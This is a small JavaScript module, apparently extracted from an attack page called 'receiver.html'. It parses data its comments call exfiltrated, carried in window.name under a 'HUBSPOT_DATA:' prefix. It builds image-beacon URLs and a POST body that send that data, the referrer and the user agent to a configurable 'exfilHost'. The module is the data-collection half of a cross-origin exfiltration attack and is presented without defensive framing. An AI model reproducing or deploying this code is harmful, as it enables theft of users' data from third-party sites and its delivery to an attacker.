/**
 * Utility functions extracted from receiver.html
 * Window-name data extraction and exfiltration URL building.
 */

const HUBSPOT_DATA_PREFIX = 'HUBSPOT_DATA:';

/**
 * Parse exfiltrated data carried in window.name.
 * Returns { raw, isHubspotData, extracted, parsed }.
 */
function parseWindowName(name) {
  const result = {
    raw: name || '',
    length: (name || '').length,
    isHubspotData: false,
    extracted: null,
    parsed: null,
    parseError: null,
  };

  if (typeof name === 'string' && name.startsWith(HUBSPOT_DATA_PREFIX)) {
    result.isHubspotData = true;
    result.extracted = name.substring(HUBSPOT_DATA_PREFIX.length);

    try {
      result.parsed = JSON.parse(result.extracted);
    } catch (e) {
      result.parseError = e.message;
    }
  }

  return result;
}

/**
 * Build the set of exfiltration image URLs that receiver.html creates.
 */
function buildExfilUrls(exfilHost, name, referrer) {
  return {
    name: exfilHost + '/?name=' + encodeURIComponent(name),
    ref: exfilHost + '/?ref=' + encodeURIComponent(referrer),
    len: exfilHost + '/?len=' + name.length,
  };
}

/**
 * Build the POST body sent by receiver.html's fetch call.
 */
function buildPostBody(name, referrer, userAgent, timestamp) {
  return {
    name,
    referrer,
    timestamp: timestamp || new Date().toISOString(),
    userAgent,
  };
}

module.exports = {
  HUBSPOT_DATA_PREFIX,
  parseWindowName,
  buildExfilUrls,
  buildPostBody,
};
